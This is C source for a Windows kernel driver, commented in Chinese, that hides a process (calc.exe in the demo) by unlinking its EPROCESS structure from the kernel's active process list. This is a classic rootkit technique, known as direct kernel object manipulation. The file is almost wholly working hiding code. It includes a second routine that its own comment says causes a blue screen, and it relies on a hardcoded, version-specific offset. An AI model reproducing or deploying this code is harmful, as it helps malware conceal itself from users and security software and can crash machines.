    #include <ntifs.h>
    #define PROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x188
     
    NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS *Process);
    NTKERNELAPI CHAR* PsGetProcessImageFileName(PEPROCESS Process);
     
    VOID UnDriver(PDRIVER_OBJECT driver)
    {
    	DbgPrint(("驱动程序卸载成功! \n"));
    }
     
    PEPROCESS GetProcessObjectByName(char *name)
    {
    	SIZE_T temp;
    	for (temp = 100; temp<10000; temp += 4)
    	{
    		NTSTATUS status;
    		PEPROCESS ep;
    		status = PsLookupProcessByProcessId((HANDLE)temp, &ep);
    		if (NT_SUCCESS(status))
    		{
    			char *pn = PsGetProcessImageFileName(ep);
    			if (_stricmp(pn, name) == 0)
    				return ep;
    		}
    	}
    	return NULL;
    }
     
    VOID RemoveListEntry(PLIST_ENTRY ListEntry)
    {
    	KIRQL OldIrql;
    	OldIrql = KeRaiseIrqlToDpcLevel();
    	if (ListEntry->Flink != ListEntry &&ListEntry->Blink != ListEntry &&ListEntry->Blink->Flink == ListEntry &&ListEntry->Flink->Blink == ListEntry)
    	{
    		ListEntry->Flink->Blink = ListEntry->Blink;
    		ListEntry->Blink->Flink = ListEntry->Flink;
    		ListEntry->Flink = ListEntry;
    		ListEntry->Blink = ListEntry;
    	}
    	KeLowerIrql(OldIrql);
    }
     
    // 隐藏指定进程(会蓝屏)
    BOOLEAN HideProcessB(PUCHAR pszHideProcessName)
    {
        PEPROCESS pFirstEProcess = NULL, pEProcess = NULL;
        ULONG ulOffset = 0;
        HANDLE hProcessId = NULL;
        PUCHAR pszProcessName = NULL;
     
        // 获取相应偏移大小
        ulOffset = PROCESS_ACTIVE_PROCESS_LINKS_OFFSET;
     
        if (0 == ulOffset)
        {
            return FALSE;
        }
     
        // 获取当前进程结构对象
        pFirstEProcess = PsGetCurrentProcess();
        pEProcess = pFirstEProcess;
     
        // 开始遍历枚举进程
        do
        {
            // 从 EPROCESS 获取进程 PID
            hProcessId = PsGetProcessId(pEProcess);
            
            // 从 EPROCESS 获取进程名称
            pszProcessName = PsGetProcessImageFileName(pEProcess);
            
            // 隐藏指定进程
            if (0 == _stricmp(pszProcessName, pszHideProcessName))
            {
                // 摘链
                RemoveEntryList((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset));
                break;
            }
     
            // 根据偏移计算下一个进程的 EPROCESS
            pEProcess = (PEPROCESS)((PUCHAR)(((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset))->Flink) - ulOffset);
        } while (pFirstEProcess != pEProcess);
        return TRUE;
    }
     
    NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
    {
    	PEPROCESS PRoc = NULL;
    	PRoc = GetProcessObjectByName("calc.exe");
     
    	// 摘除结构中的calc.exe 实现驱动隐藏计算器
    	RemoveListEntry((PLIST_ENTRY)((ULONG64)PRoc + PROCESS_ACTIVE_PROCESS_LINKS_OFFSET));
    	DriverObject->DriverUnload = UnDriver;
    	return STATUS_SUCCESS;
    }
